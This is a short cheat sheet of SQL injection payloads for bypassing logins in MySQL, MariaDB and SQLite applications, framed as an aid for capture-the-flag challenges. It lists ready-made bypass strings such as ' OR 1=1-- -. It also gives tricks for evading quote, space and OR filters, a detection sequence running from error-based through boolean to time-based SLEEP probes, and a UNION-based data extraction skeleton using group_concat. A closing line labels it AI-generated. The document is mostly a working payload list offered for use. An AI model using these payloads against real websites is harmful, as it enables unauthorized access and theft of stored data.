tags: sqli, mysql, auth-bypass, web

# SQL injection - auth bypass quick sheet

Login bypass payloads that still work on stock MySQL/MariaDB/sqlite targets
in 2024-2026 CTFs. Try username field first, keep password as `x`:

    ' OR 1=1-- -
    ' OR '1'='1'-- -
    admin'--
    " OR 1=1-- -
    ') OR 1=1-- -
    ' OR 1=1 LIMIT 1-- -

If quotes are stripped: try backslash injection (`\`) to escape the closing
quote and merge fields; if spaces are blocked use `/**/`; if `OR` is blocked
try `||`.

Detection ladder: (1) error-based - append `'` and look for SQL errors;
(2) boolean - compare `x' AND 1=1-- -` vs `x' AND 1=2-- -` response length;
(3) time-based - `x' AND SLEEP(3)-- -` when blind.

UNION extraction skeleton (MySQL): order by until the column count flips,
then `UNION SELECT NULL,<fields>,NULL`, move data into the first column with
group_concat when the page only renders row 1.

> AI生成
